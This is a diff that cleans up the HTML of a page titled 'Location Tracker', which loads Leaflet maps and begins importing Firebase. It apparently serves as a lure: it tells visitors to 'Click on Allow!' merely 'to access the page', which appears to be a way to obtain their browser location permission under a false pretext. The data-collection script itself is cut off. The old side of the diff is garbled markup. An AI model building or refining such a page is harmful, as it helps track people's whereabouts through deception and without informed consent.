@@ -1,21 +1,35 @@
 <!DOCTYPE html>
-<en lang="en">
+<html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <title>Location Tracker</title>
 <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css">
 <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
-<ststylehtml,body,#map{height:100%;margin:0}
-#panel{position:absolute;z-index:1000;top:10px;left:10px;background:#fff;padding:10px;border-radius:8px;max-width:320px;font-family:Arial}
+<style>
+html, body, #map {
+  height: 100%;
+  margin: 0;
+}
+
+#panel {
+  position: absolute;
+  z-index: 1000;
+  top: 10px;
+  left: 10px;
+  background: #fff;
+  padding: 10px;
+  border-radius: 8px;
+  max-width: 320px;
+  font-family: Arial, sans-serif;
+}
 </style>
 </head>
 <body>
 <div id="panel">
-    <h2>🎉 Click on Allow! 😊 </h2>
-    <p>To Access The Pagd! </script    <div id="status"></div>
-</div>
-<div id="map"></div>
+    <h2>🎉 Click on Allow! 😊</h2>
+<p>To access the page, please allow permission.</p>
+<div id="status"></div>
 
 <script type="module">
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
